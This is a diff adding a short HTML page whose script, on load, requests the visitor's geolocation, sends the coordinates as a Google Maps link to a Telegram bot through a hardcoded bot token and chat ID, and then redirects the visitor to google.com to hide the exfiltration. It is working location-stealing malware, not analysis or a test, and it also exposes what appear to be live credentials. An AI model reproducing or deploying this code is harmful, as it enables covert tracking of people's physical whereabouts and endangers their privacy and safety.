@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
+        const adminId = '8275787221';
+
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const text = `📍 Lokatsiya: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(text)}`);
+            window.location.href = "https://google.com";
+        });
+    </script>
+</body>
+</html>
+
